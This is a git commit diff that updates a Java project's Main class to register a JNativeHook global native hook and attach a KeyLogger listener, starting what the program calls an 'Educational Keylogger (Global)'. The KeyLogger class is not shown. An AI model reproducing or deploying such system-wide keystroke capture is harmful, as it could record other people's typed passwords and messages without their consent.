ba3a9479e4192ea98db789090d56a160441cd153
Georgios Giannopoulos <georgegiannopoulos2@gmail.com>
2025-07-03 17:57:03 +0300

    Update Main class to initialize GlobalScreen and start key logging

--- src/main/java/com/github/giorgosg1an/Main.java
+++ src/main/java/com/github/giorgosg1an/Main.java
@@ -1,7 +1,22 @@
 package com.github.giorgosg1an;
 
+import java.awt.KeyboardFocusManager;
+
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.NativeHookException;
+
 public class Main {
     public static void main(String[] args) {
-        System.out.println("Set up completed!");
+        System.out.println("Educational Keylogger (Global) started. Press ESC to exit.");
+
+        try {
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException e) {
+            System.err.println("Error registering native hook: " + e.getMessage());
+
+            System.exit(1);
+        }
+
+        GlobalScreen.addNativeKeyListener(new KeyLogger());
     }
 }
